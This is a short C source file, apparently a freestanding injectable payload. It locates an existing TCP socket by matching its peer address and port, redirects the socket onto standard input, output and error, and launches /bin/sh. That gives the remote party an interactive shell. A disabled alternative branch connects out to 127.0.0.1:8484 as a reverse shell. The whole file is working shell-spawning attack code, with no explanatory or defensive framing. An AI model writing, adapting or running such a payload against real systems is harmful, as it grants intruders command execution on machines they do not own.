#define _GNU_SOURCE
#define FS_INLINE_SYSCALL
#define FS_INLINE_MUTEX_SLOW_PATH
#include "freestanding.h"

#include "axon.h"

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <stdnoreturn.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <errno.h>

union sockaddr_buf {
	struct sockaddr addr;
	struct sockaddr_in in;
	struct sockaddr_in6 in6;
};

#ifdef __linux__
__attribute__((used))
noreturn void release(uint32_t expected_addr, uint32_t expected_port)
#else
int main(void)
#endif
{
#if 1
	int fd = 0;
	for (;;) {
		union sockaddr_buf sa;
		socklen_t len = sizeof(sa);
		intptr_t result = FS_SYSCALL(SYS_getpeername, fd, (intptr_t)&sa, (intptr_t)&len);
		if (result == 0 && sa.addr.sa_family == AF_INET && sa.in.sin_addr.s_addr == expected_addr && sa.in.sin_port == expected_port) {
			break;
		}
		fd++;
	}
	(void)fs_fcntl(fd, F_SETFL, O_RDWR);
	(void)fs_fcntl(fd, F_SETFD, 0);
#else
	int fd = fs_socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in addr = { 0 };
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = fs_htonl((127 << 24) | 1);
	addr.sin_port = fs_htons(8484);
	fs_connect(fd, &addr, sizeof(addr));
#endif
	intptr_t result = fs_fork();
	if (result != 0) {
		fs_exit(0);
	}
	(void)fs_dup2(fd, 0);
	(void)fs_dup2(fd, 1);
	(void)fs_dup2(fd, 2);
	(void)fs_execve("/bin/sh", NULL, NULL);
	__builtin_unreachable();
	// fs_exit(0);
#ifndef __linux__
	return 0;
#endif
}
